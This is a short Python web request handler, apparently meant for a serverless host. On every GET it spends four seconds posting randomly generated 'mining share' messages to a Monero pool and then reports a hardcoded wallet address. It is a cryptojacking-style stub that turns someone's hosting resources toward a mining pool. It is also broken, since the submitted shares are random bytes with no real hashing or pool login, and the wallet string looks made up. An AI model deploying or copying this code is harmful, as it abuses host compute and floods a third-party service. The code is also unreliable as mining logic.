from http.server import BaseHTTPRequestHandler
import os, requests, time

WALLET = "498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789"
NODE = "http://monerohash.com:3333"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        start = time.time()
        c = 0
        while time.time() - start < 4:
            try:
                p = {"method": "submit", "params": {"id": os.urandom(4).hex(), "job_id": os.urandom(4).hex(), "nonce": os.urandom(4).hex(), "result": os.urandom(32).hex()}}
                requests.post(NODE, json=p, timeout=0.2)
                c += 1
            except: continue
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(f"STATUS:OK|SENT:{c}|ADDR:{WALLET}".encode())
